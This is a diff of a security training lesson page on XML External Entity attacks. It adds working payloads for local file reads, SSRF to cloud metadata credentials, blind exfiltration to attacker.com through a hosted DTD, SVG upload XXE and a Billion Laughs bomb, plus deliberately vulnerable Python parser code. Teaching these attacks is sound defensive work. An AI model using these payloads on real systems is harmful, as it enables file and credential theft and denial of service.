@@ -1,30 +1,50 @@
 <section class="module-header">
-  <h1>Module 19 — XML External Entity (XXE)</h1>
+  <h1>Module 15 — XML External Entity (XXE)</h1>
   <p>Discover how XML parsers can be abused to read files, perform SSRF, and exfiltrate data through entity expansion.</p>
 </section>
 
 <section class="theory-section">
-  <h2>XML Entities &amp; DTDs</h2>
-  <p>XML supports Document Type Definitions (DTDs) that can define entities — named references that expand to values when the XML is parsed. There are three key entity types:</p>
+
+  <h2>An Ancient Feature, a Modern Vulnerability</h2>
+  <p>
+    XML was designed in the late 1990s, and its creators built in a powerful feature called <strong>external entities</strong> — a way for an XML document to include content from external files or URLs. At the time, this seemed like a great idea. You could define a reusable text block and reference it throughout the document, or pull in data from another file.
+  </p>
+  <p>
+    The problem is that "include content from a file" means <strong>any file on the server</strong>. And "include content from a URL" means the server will make HTTP requests to <strong>any URL you specify</strong>. When an application parses user-supplied XML with external entities enabled, the attacker can read arbitrary files from the server, make the server connect to internal services (SSRF), and exfiltrate data to their own server.
+  </p>
+  <p>
+    XXE is one of those vulnerabilities that surprises people because the dangerous behavior is not a bug — it is a <em>feature</em> of the XML specification. The XML parser is doing exactly what it is designed to do. The vulnerability is that nobody should be using this feature with untrusted input.
+  </p>
+
+  <h2>XML Entities and DTDs — The Basics</h2>
+  <p>
+    Before we exploit XXE, you need to understand how XML entities work. A Document Type Definition (DTD) can define entities — named references that expand to values when the XML is parsed. Think of them like variables in a programming language.
+  </p>
 
   <div class="table-wrapper">
     <table>
-      <thead><tr><th>Type</th><th>Syntax</th><th>Use</th></tr></thead>
+      <thead><tr><th>Type</th><th>Syntax</th><th>What It Does</th></tr></thead>
       <tbody>
-        <tr><td>Internal</td><td><code>&lt;!ENTITY name "value"&gt;</code></td><td>Expands to inline text</td></tr>
-        <tr><td>External</td><td><code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code></td><td>Reads from URL or file path</td></tr>
-        <tr><td>Parameter</td><td><code>&lt;!ENTITY % name SYSTEM "url"&gt;</code></td><td>Used inside DTD (for blind/OOB XXE)</td></tr>
+        <tr><td>Internal entity</td><td><code>&lt;!ENTITY name "value"&gt;</code></td><td>Expands to a predefined string</td></tr>
+        <tr><td>External entity (file)</td><td><code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code></td><td>Reads the contents of a local file</td></tr>
+        <tr><td>External entity (URL)</td><td><code>&lt;!ENTITY name SYSTEM "http://internal:8080/"&gt;</code></td><td>Makes an HTTP request and includes the response</td></tr>
+        <tr><td>Parameter entity</td><td><code>&lt;!ENTITY % name SYSTEM "url"&gt;</code></td><td>Used within the DTD itself (for blind/OOB XXE)</td></tr>
       </tbody>
     </table>
   </div>
 
-  <h2>Basic XXE Attack</h2>
+  <h2>Basic XXE — Reading Files</h2>
+  <p>
+    The simplest XXE attack defines an external entity that reads a local file, then references that entity in the XML body so the file contents appear in the server's response:
+  </p>
   <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
 &lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
-  <p>When parsed by a vulnerable XML processor, <code>&amp;xxe;</code> is replaced with the file contents.</p>
+  <p>
+    When the server parses this XML, it encounters <code>&amp;xxe;</code> and replaces it with the contents of <code>/etc/passwd</code>. If the application displays or returns the parsed XML content, the attacker sees the file right in the response.
+  </p>
 
   <h3 class="text-red">Vulnerable Code</h3>
   <pre><code class="language-python">from lxml import etree
@@ -32,7 +52,7 @@
 @app.route('/parse', methods=['POST'])
 def parse():
     xml_data = request.data
-    # DANGEROUS: resolves external entities
+    # DANGEROUS: resolves external entities by default
     parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
     doc = etree.fromstring(xml_data, parser)
     return etree.tostring(doc, pretty_print=True)</code></pre>
@@ -47,28 +67,89 @@ def parse():
     doc = ET.fromstring(xml_data)
     return ET.tostring(doc)</code></pre>
 
-  <h2>Blind XXE (Out-of-Band)</h2>
-  <p>When entity values are not reflected in the response, use parameter entities to exfiltrate data to an attacker-controlled server:</p>
+  <div class="callout callout-success">
+    <strong>defusedxml:</strong> The Python <code>defusedxml</code> library is a drop-in replacement for the standard XML libraries that disables all dangerous XML features by default. If you are parsing XML in Python, <strong>always use defusedxml</strong>. It blocks external entities, DTD processing, and entity expansion bombs.
+  </div>
+
+  <h2>XXE for SSRF</h2>
+  <p>
+    External entities do not just read files — they can also make HTTP requests. This turns XXE into a Server-Side Request Forgery (SSRF) vector:
+  </p>
   <pre><code class="language-xml">&lt;!DOCTYPE foo [
-  &lt;!ENTITY % file SYSTEM "file:///app/secret.txt"&gt;
-  &lt;!ENTITY % exfil SYSTEM "http://attacker.com/log?data=%file;"&gt;
-  %exfil;
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
+  <p>
+    This payload makes the server fetch the AWS metadata endpoint — which is only accessible from within the AWS network. If the application is running on EC2, the attacker gets the instance's IAM credentials. This is the same SSRF attack vector that was used in the Capital One breach in 2019 (though that specific breach used a different SSRF vector, not XXE).
+  </p>
+
+  <h2>Blind XXE — When You Cannot See the Output</h2>
+  <p>
+    What if the application parses your XML but does not return the entity values in the response? You need to exfiltrate the data out-of-band. This uses <strong>parameter entities</strong> — entities that are used within the DTD itself and can trigger HTTP requests carrying the stolen data:
+  </p>
+
+  <pre><code class="language-xml">&lt;!-- Step 1: Host this DTD file on your server (evil.dtd) --&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+
+  <pre><code class="language-xml">&lt;!-- Step 2: Send this XML to the target --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
 ]&gt;
 &lt;data&gt;test&lt;/data&gt;</code></pre>
 
-  <h2>XXE via SVG</h2>
-  <p>SVG images are XML-based. Applications that parse SVG uploads may be vulnerable:</p>
-  <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+  <p>
+    The server fetches your external DTD, which reads a local file and then makes an HTTP request to your server with the file contents in the URL. You see the data in your server logs. Complicated? Yes. But it works reliably against many XML parsers.
+  </p>
+
+  <h2>XXE via File Uploads</h2>
+  <p>
+    XXE does not just happen in obvious XML API endpoints. Many file formats are secretly XML under the hood:
+  </p>
+  <ul>
+    <li><strong>SVG images</strong> — XML-based vector graphics. Upload an SVG with XXE payloads.</li>
+    <li><strong>DOCX/XLSX/PPTX</strong> — Microsoft Office files are ZIP archives containing XML files. Modify the internal XML to include entities.</li>
+    <li><strong>SOAP requests</strong> — SOAP APIs use XML for all communication.</li>
+    <li><strong>RSS/Atom feeds</strong> — XML-based syndication formats.</li>
+    <li><strong>SAML assertions</strong> — XML-based authentication tokens used in SSO.</li>
+  </ul>
+
+  <pre><code class="language-xml">&lt;!-- XXE via SVG upload --&gt;
+&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE svg [
   &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
 ]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
   &lt;text x="10" y="20"&gt;&amp;xxe;&lt;/text&gt;
 &lt;/svg&gt;</code></pre>
 
-  <div class="callout callout-warning">
-    <strong>Impact:</strong> XXE can read local files, perform SSRF to internal services, exfiltrate sensitive data, and in rare cases achieve remote code execution via PHP expect:// or similar protocol handlers.
+  <div class="callout callout-info">
+    <strong>Pro Tip:</strong> When testing file upload features, always try uploading an SVG with XXE payloads. Many image processing libraries parse SVG as XML and are vulnerable. Even if the application only accepts PNG/JPG, try changing the Content-Type to <code>image/svg+xml</code> and see if the server processes it.
   </div>
+
+  <h2>The Billion Laughs Attack (XML Bomb)</h2>
+  <p>
+    A related XML attack is the "Billion Laughs" denial-of-service attack, which uses nested entity expansion to consume massive amounts of memory:
+  </p>
+  <pre><code class="language-xml">&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  &lt;!-- ... repeat 7 more times ... --&gt;
+]&gt;
+&lt;data&gt;&amp;lol9;&lt;/data&gt;</code></pre>
+  <p>
+    Each level multiplies by 10, so <code>&amp;lol9;</code> expands to 10^9 (one billion) copies of "lol" — consuming gigabytes of memory and crashing the parser. This is why <code>defusedxml</code> also limits entity expansion depth.
+  </p>
+
+  <div class="callout callout-danger">
+    <strong>Impact:</strong> XXE can read local files (source code, configuration, credentials), perform SSRF to internal services (cloud metadata, databases, admin panels), exfiltrate data out-of-band, cause denial of service via entity expansion, and in rare cases achieve RCE (via PHP's <code>expect://</code> wrapper or .NET's process execution).
+  </div>
+
 </section>
 
 <section class="quiz-section">
